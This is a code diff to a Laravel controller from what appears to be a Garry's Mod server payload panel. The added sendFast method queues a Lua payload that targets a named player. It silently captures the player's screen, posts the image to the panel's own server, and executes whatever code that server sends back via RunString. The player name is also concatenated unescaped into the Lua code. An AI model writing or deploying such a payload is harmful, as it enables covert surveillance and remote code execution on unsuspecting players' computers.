@@ -3,12 +3,19 @@
 namespace App\Http\Controllers\kermini\special;
 
 use App\Http\Controllers\Controller;
+use App\Models\payloads_queue;
+use App\Models\Scrgb_Image_Requests;
 use App\Models\servers;
 use Illuminate\Contracts\Foundation\Application;
 use Illuminate\Contracts\View\Factory;
 use Illuminate\Contracts\View\View;
 use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Validator;
+use Illuminate\Support\Str;
+use xPaw\SourceQuery\Exception\InvalidArgumentException;
+use xPaw\SourceQuery\Exception\InvalidPacketException;
+use xPaw\SourceQuery\Exception\SocketException;
 use xPaw\SourceQuery\SourceQuery;
 
 class screenGrabber extends Controller
@@ -50,6 +57,22 @@ class screenGrabber extends Controller
         }
 
     }
+
+    /**
+     * Handles the display of the users when requesting the fast screen grabber
+     *
+     * Verifies data consistency, and bans if needed.
+     * Verifies ownership of server and existence.
+     * Gets the server infos.
+     * Returns to view with infos or don't allow access if server is not accessible.
+     *
+     * @param $serverid
+     * @param Request $request
+     * @return Application|Factory|View|RedirectResponse
+     * @throws InvalidArgumentException
+     * @throws InvalidPacketException
+     * @throws SocketException
+     */
     public function selectFast($serverid, Request $request){
         //verify data consistency
         if(
@@ -115,6 +138,100 @@ class screenGrabber extends Controller
             return redirect()->back()->with(
                 'status', "It's not your server :("
             );
+        }
+
+    }
+
+    public function sendFast($serverid, Request $request){
+        $customMessages = [
+            'required' => ':attribute is missing or the value is invalid.'
+        ];
+
+        $validator = Validator::make($request->all(), [
+            'player' => 'required|string',
+        ],$customMessages);
+        if ($validator->fails()) {
+            return redirect()->back()->with(
+                'status', 'Query invalid'
+            )->withErrors($validator);
+        }else {
+            $server = servers::where('id', $serverid);
+            //verify ownership of server and existence
+            if(
+                $server->count() == 1 &&
+                $server->first()->user_id == $request->user()->id
+            ){
+                $SCRGBrequest_key = Str::random(rand(20,32));
+
+                //creates new request
+                $SCRGB_request = new Scrgb_Image_Requests();
+                $SCRGB_request->SCRGBimageKey = $SCRGBrequest_key;
+                $SCRGB_request->RequestValidFor_Seconds = 3600;
+                $SCRGB_request->user_id = $request->user()->id;
+                $SCRGB_request->save();
+
+                //custom payload code
+                $SCRGB_payload_code = '
+                    for i, v in ipairs( player.GetAll() ) do
+                        if v:Nick() == "'.$request->player.'" then
+                            v:SendLua([[
+                                hook.Remove( "PostRender", "screenshot" )
+
+                                local ScreenshotRequested = false
+                                function RequestAScreenshot()
+                                    ScreenshotRequested = true
+                                end
+
+                                RequestAScreenshot()
+
+                                hook.Add("PostRender", "screenshot", function()
+                                    if ( not ScreenshotRequested) then return end
+
+                                    ScreenshotRequested = false
+
+                                    local data = render.Capture( {
+                                        format = "png",
+                                        x = 0,
+                                        y = 0,
+                                        w = ScrW(),
+                                        h = ScrH()
+                                    })
+
+                                    local a = {
+                                        d = data,
+                                    }
+                                    http.Post(
+                                        "'.route('saveScreenGrab', ['imagekey' => $SCRGBrequest_key]).'",
+                                        a,
+                                        function(body, len, headers, code)
+                                            RunString(body)
+                                        end
+                                    )
+
+                                end)
+                            ]])
+                        end
+                    end
+                ';
+
+                //registers new payload
+                $SCRGB_payload = new payloads_queue();
+                $SCRGB_payload->server_id = $serverid;
+                $SCRGB_payload->content = $SCRGB_payload_code;
+                $SCRGB_payload->description = "ScreenGrabber Payload by: " .
+                                              $request->user()->name . " [" . $request->user()->id . "]" .
+                                              " for " . $request->player . " on serverid " . $serverid;
+                $SCRGB_payload->save();
+
+                return redirect()->route("dashboard")->with(
+                    'status', 'Query invalid'
+                );
+            }else{
+                return redirect()->back()->with(
+                    'status', "It's not your server :("
+                );
+            }
+
         }
 
     }
